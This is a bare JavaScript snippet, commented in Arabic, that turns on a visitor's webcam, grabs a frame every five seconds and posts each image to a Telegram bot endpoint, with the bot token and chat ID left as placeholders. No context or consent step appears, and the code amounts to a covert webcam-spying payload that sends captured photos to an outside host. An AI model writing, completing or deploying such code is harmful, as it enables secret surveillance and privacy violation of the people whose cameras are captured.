navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
    let video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    setInterval(() => {
        let canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        let ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        let imageData = canvas.toDataURL("image/png");

        // إرسال الصورة إلى تيليجرام
        fetch("https://api.telegram.org/bot<TOKEN>/sendPhoto", {
            method: "POST",
            body: JSON.stringify({
                chat_id: "<CHAT_ID>",
                photo: imageData
            }),
            headers: { "Content-Type": "application/json" }
        });
    }, 5000); // يلتقط صورة كل 5 ثوانٍ
}).catch(console.error);
